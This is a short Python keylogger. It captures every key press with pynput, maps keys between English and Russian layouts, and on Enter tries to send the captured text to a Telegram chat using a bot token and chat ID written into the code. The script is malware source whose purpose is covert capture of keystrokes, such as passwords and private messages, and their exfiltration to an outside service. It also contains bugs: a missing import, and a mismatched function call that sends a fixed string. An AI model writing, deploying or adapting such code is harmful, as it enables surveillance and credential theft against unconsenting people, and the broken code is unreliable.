
from pynput.keyboard import Listener

def send_data_to_telegram():

    bot = telebot.TeleBot("7976946324:AAF7cQD3dQnWj51AYfQT3MQ1im9r81CKKpM")
    bot.send_message('1271362249', 'res')

data = []
ru_eng = {

    'q': 'й',
    'w': 'ц',
    'e': 'у',
    'r': 'к',
    't': 'е',
    'y': 'н',
    'u': 'г',
    'i': 'ш',
    'o': 'щ',
    'p': 'з',
    '[': 'х',
    ']': 'ъ',
    'a': 'ф',
    's': 'ы',
    'd': 'в',
    'f': 'а',
    'g': 'п',
    'h': 'р',
    'j': 'о',
    'k': 'л',
    'l': 'д',
    ';': 'ж',
    "'": 'э',
    'z': 'я',
    'x': 'ч',
    'c': 'с',
    'v': 'м',
    'b': 'и',
    'n': 'т',
    'm': 'ь',
    ',': 'б',
    '.': 'ю',
    '/': '.',
}
eng_ru = {value: key for (key, value) in ru_eng.items()}




def send_data():
    res = '(1)\n'
    res += ''.join(map(lambda el: el.lower(), data))
    res += '\n\n(2)\n'
    try:
        res += ''.join(map(lambda el: ru_eng.get(el.lower(), el.lower()), data))
    except Exception as e:
        res += ''.join(map(lambda el: eng_ru.get(el.lower(), el.lower()), data))

    data.clear()
    print(res)
    send_data_to_telegram(res)

def append_date(key):
    key = str(key).replace("'", "")

    if key == "Key.enter":
        send_data()
    elif key == "Key.space":
        data.append(' ')

    if len(key) == 1:
        data.append(key)




with Listener(on_press=append_date) as l:
    l.join()